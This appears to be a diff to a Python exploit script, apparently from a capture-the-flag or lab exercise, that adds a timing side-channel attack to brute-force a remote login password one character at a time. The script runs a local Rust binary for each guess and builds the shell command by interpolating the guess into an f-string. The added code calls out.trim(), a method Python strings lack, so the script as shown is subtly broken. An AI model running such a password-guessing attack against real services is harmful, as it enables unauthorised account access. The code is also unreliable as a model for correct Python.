@@ -5,6 +5,7 @@ import select
 import re
 from datetime import datetime
 from assemble import assemble_inline, assemble_file
+import subprocess
 from utils import *
 
 con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -383,3 +384,32 @@ def connect_serv2_and_measure_time(password, username="ax.arwen"):
     res = send(password + "\n", timeout=10, expected_end="Username: ")
     end_time = datetime.now()
     return (end_time-start_time), res
+
+
+def try_password(pw):
+    st, out = subprocess.getstatusoutput(f"rust_stuff/target/release/rust_stuff {pw}")
+    print(out)
+    if st != 0:
+        raise Exception("Subproc failed with status", st)
+
+    _pw, time_ns, succ = out.trim().split(", ")
+    assert pw == _pw
+    time_ns = int(time_ns)
+
+    return time_ns, succ
+
+
+def try_passwords(prefix):
+    timings = {}
+    alpha_lower = "qwertyuiopasdfghjklzxcvbnm"
+    alphanum = alpha_lower + alpha_lower.upper() + "1234567890"
+
+    for ch in alphanum:
+        pw = prefix + ch
+        time_ns, succ = try_password(pw)
+        timings[pw] = time_ns
+        if succ == "true":
+            print("Successful password??", pw)
+            raise Exception("Yay!", pw)
+
+    return timings
